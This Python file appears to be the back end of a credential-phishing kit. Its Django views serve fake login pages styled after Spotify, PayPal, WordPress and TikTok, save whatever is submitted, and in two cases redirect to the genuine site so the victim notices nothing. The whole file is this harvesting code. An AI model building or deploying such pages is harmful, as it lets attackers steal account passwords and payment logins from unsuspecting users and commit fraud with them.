from django.shortcuts import render
from django.views.generic import CreateView
from . import forms



class SpotifyView(CreateView):
    template_name = "spotify/login.html"
    form_class = forms.SpotifyForm
    success_url = "https://www.spotify.com/"


class PaypalView(CreateView):
    template_name = "paypal/login.html"
    form_class = forms.PaypalForm
    success_url = "https://www.paypal.com/"


class WordPressView(CreateView):
    template_name = "wordpress/login.html"
    form_class = forms.WordPressForm
    success_url = "#"


class TiktokView(CreateView):
    template_name = "tiktok/login.html"
    form_class = forms.TiktokForm
    success_url = "#"